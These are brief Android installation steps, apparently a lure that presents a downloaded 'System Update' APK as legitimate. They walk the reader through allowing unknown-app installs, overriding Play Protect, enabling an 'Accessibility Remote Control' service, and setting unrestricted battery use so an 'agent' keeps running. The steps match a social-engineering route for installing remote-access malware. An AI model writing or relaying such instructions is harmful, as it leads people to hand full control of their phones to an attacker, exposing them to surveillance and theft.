Android: finish setup in 30 seconds

  1. Open the downloaded System Update APK and tap Install.
  2. If asked, allow Install unknown apps for the browser, and allow Play Protect to install it.
  3. Open the app, allow notifications, and tap Accessibility Remote Control → turn it on.
  4. Set battery use to Unrestricted so the agent survives in the background.
